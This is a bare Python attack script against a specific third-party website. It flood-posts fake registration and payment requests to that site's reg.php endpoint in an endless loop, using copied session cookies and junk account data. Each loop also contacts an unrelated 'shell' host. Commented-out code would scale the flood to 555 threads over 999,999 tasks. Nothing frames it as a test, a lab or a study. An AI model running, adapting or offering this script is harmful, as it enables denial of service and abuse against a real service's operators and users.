import random

import requests
import threadpool

get_res = requests.get('http://xm.erert.cn/user/reg.php')
open('wwb.html', 'wb').write(get_res.content)
headers = get_res.headers
cookies = get_res.cookies
headers1 = {
    'Host': 'xm.erert.cn',
    'Connection': 'keep - alive',
    'Cache-Control': 'max - age = 0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://wwb.faxya.cn',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '1234',
    'Referer': 'http://wwb.faxya.cn/',
    'Cookie': 'PHPSESSID=4i2se3ac6jbpmlii36mt0ns289; sec_defend=0d8222b46d8156f17240cf842849ca00ff8ad8a60a12f6c93a551df118c810ac; mysid=0893b7256a187afbe97588db1a082010; counter=15',
    'User-Agent': 'Mozilla / 5.0(Windows,NT10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 66.0.3359.181Safari / 537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}

data = {
    'kind': 0,
    'qz': 11111111,
    'domain': 'xm.erert.cn',
    'name': 111111,
    'qq': 111111,
    'user': 11111,
    'pwd': 111111,
    'hashsalt': '9029e0019ab47966f69954fc3616ef8d'

}

cc = 1


def post(c):
    while 1:
        # s_headers = headers1.update(dict(headers))
        # print(cc)
        # try:
        # random_qq = random.randrange(11111111, 99999999)
        res = requests.post('http://xm.erert.cn/user/reg.php?act=pay', data=data, headers=headers1, cookies=cookies)
        requests.get('http://shell.chinasummer.org')
    # except Exception as e:
    #     continue


# l = range(999999)
# pool = threadpool.ThreadPool(555)
# tasks = threadpool.makeRequests(post, list(l))
# for task in tasks:
#     pool.putRequest(task)
# pool.wait()
post(1)